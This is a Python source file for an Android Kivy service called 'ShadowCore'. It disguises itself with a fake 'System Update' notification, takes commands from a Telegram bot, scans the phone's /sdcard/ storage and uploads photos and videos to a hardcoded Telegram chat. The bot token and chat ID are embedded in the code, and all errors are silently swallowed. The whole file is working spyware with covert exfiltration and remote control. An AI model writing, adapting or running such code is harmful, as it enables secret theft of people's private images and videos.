import os
import time
import requests
from threading import Thread
from jnius import autoclass

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"
URL = f"https://api.telegram.org/bot{TOKEN}/"

def start_foreground_service():
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        Context = autoclass('android.content.Context')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationManager = autoclass('android.app.NotificationManager')
        
        channel_id = 'shadow_core'
        channel = NotificationChannel(channel_id, 'System Update', 3)
        manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
        manager.createNotificationChannel(channel)
        
        builder = NotificationBuilder(service, channel_id)
        builder.setContentTitle("System Update")
        builder.setContentText("Checking for system compatibility...")
        builder.setSmallIcon(service.getApplicationInfo().icon)
        
        service.startForeground(1, builder.build())
    except: pass

class ShadowService:
    def __init__(self):
        self.sent_files = []

    def send(self, text):
        try: requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text})
        except: pass

    def send_file(self, path):
        try:
            with open(path, 'rb') as f:
                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": f})
            return True
        except: return False

    def scan(self, ext):
        self.send(f"🔎 Scanning for {ext}...")
        found = 0
        for r, d, f_list in os.walk("/sdcard/"):
            for f in f_list:
                if f.lower().endswith(ext):
                    p = os.path.join(r, f)
                    if p not in self.sent_files and os.path.getsize(p) > 100000:
                        if self.send_file(p):
                            self.sent_files.append(p)
                            found += 1
                            time.sleep(1)
                        if found >= 20: return
        self.send(f"🏁 Done. Found {found} items.")

    def run(self):
        start_foreground_service()
        self.send("✅ ShadowCore Active in Background")
        last_id = 0
        while True:
            try:
                res = requests.get(URL + "getUpdates", params={"offset": last_id+1, "timeout": 20}).json()
                for up in res.get("result", []):
                    last_id = up["update_id"]
                    cmd = up.get("message", {}).get("text", "").upper()
                    if cmd == "M": Thread(target=self.scan, args=(".jpg",)).start()
                    if cmd == "O": Thread(target=self.scan, args=(".mp4",)).start()
            except: time.sleep(10)

if __name__ == "__main__":
    ShadowService().run()
